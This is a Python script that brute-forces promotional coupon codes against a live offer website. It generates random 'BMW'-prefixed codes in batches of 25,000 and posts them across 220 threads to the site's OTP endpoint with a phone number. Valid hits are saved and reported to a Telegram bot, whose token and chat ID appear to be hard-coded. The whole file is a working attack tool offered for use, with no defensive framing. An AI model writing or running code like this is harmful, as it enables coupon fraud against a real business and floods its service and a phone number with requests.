import requests
import time
import random
import string
import concurrent.futures
import os
from datetime import datetime

# Config
TEST_MOBILE = os.getenv("TEST_MOBILE", "9369556930")
TELEGRAM_BOT_TOKEN = os.getenv("8556329069:AAGHfWrADjuPSXz2WgNsAJN6AyiO7JadgDs")
TELEGRAM_CHAT_ID = os.getenv("8776758021")

BATCH_SIZE = 25000
MAX_WORKERS = 220

session = requests.Session()

def send_telegram(text):
    if not TELEGRAM_BOT_TOKEN:
        return
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            json={"chat_id": TELEGRAM_CHAT_ID, "parse_mode": "HTML", "text": text},
            timeout=5
        )
    except:
        pass

def generate_code():
    return "BMW" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=7))

def check_code(code):
    try:
        r = session.post(
            "https://www.grainotch.theofferclub.in/home/generateOTP",
            data={"phone": TEST_MOBILE, "ccode": code},
            headers={"User-Agent": "Mozilla/5.0"},
            timeout=6
        )
        if r.status_code == 200 and r.json().get("status") == "success":
            send_telegram(f"<b>🎉 VALID CODE!</b>\n<code>{code}</code>")
            with open("valid_codes.txt", "a") as f:
                f.write(f"{code}\n")
            return True
    except:
        pass
    return False

def main():
    send_telegram("<b>🚀 Railway Premium Bot Started</b>")
    print("Bot Started...")
    
    while True:
        codes = [generate_code() for _ in range(BATCH_SIZE)]
        with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as pool:
            pool.map(check_code, codes)

if __name__ == "__main__":
    main()